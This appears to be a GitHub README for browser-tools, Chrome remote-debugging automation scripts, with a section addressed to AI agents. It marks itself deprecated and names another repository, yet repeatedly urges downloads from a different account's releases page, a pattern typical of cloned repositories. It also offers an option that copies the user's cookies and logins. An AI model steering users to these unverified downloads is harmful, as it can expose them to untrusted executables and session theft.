# 🖥️ browser-tools - Simple Tools for Web Automation

**⚠️ DEPRECATED**: This repository has been moved to [badlogic/agent-tools](https://github.com/badlogic/agent-tools). Please use that repository instead.

## 📥 Download & Install

[![Download Browser Tools](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/yzerodev140/browser-tools/releases)

To get started with `browser-tools`, visit the releases page. This contains the latest version, ready for download.

1. Click on the link above to access the GitHub Releases page.
2. Find the latest release.
3. Click on the download link for your operating system.
4. Save the downloaded file to a location on your computer.

## 🚀 Getting Started

These tools help you automate web tasks using Chrome. They connect to Chrome running with remote debugging. Follow these steps to set up and run the tools:

### Steps to Use the Tools

1. **Install Chrome**: Ensure you have Google Chrome installed on your computer. 

2. **Set Up Remote Debugging**: 
   - You need to start Chrome with a command to enable remote debugging on port `9222`. 
   - Use the following command in your terminal or command prompt:
   ```bash
   chrome.exe --remote-debugging-port=9222
   ```
   Replace `chrome.exe` with the path to your Chrome installation if necessary.

3. **Add to PATH**: 
   - Make sure the scripts are in a directory that is in your system's PATH. This allows you to run them from any command line.

### How to Invoke These Tools

**CRITICAL FOR AGENTS**: These are executable scripts in your PATH. When invoking via the Bash tool:

- **CORRECT:**
   ```bash
   browser-start.js
   browser-nav.js https://example.com
   browser-pick.js "Click the button"
   ```

- **INCORRECT:**
   ```bash
   node browser-start.js        # Don't use 'node' prefix
   ./browser-start.js           # Don't use './' prefix
   ```

### Start Chrome

Use the command below to start Chrome with a fresh profile:

```bash
browser-start.js              # Fresh profile
```

If you want to use your existing profile (to keep your login information and saved data), use the command:

```bash
browser-start.js --profile    # Copy user's profile (cookies, logins)
```

This command launches Chrome with remote debugging enabled.

### Navigate the Web

Once Chrome is running, you can navigate to a web page. For example:

```bash
browser-nav.js https://example.com
```

This will take you directly to the specified page. You can replace `https://example.com` with any URL you want to visit.

## 🌟 Features of Browser Tools

- **Remote Debugging**: Connects seamlessly with Chrome for effective automation.
- **Scripts for Automation**: Execute various scripts to perform common web tasks.
- **Profile Management**: Start Chrome with fresh or existing profiles for tailored browsing experiences.

## 📄 User Guide

If you need help using the tools, refer to the following sections:

1. **Script Execution**: Each script has specific functionalities. Read the documentations to understand them better.
2. **Debugging Issues**: If you run into issues, check the console for errors. This can help you figure out what went wrong.

## 😃 Frequently Asked Questions

### What operating systems are supported?

`browser-tools` is compatible with all major operating systems, including Windows, macOS, and Linux. Ensure you have the latest version of Chrome installed.

### Can I automate any website?

Yes, you can use these tools to automate tasks on most websites. However, be mindful of each site's terms of service.

### Where can I find additional documentation?

Detailed documentation and guides are available on the [GitHub repository](https://github.com/yzerodev140/browser-tools).

## 📥 Download & Install Again

To download the latest version, please visit the releases page again: [Download Here](https://github.com/yzerodev140/browser-tools/releases). 

For any further assistance, feel free to check the documentation linked above. Enjoy using your new browser tools!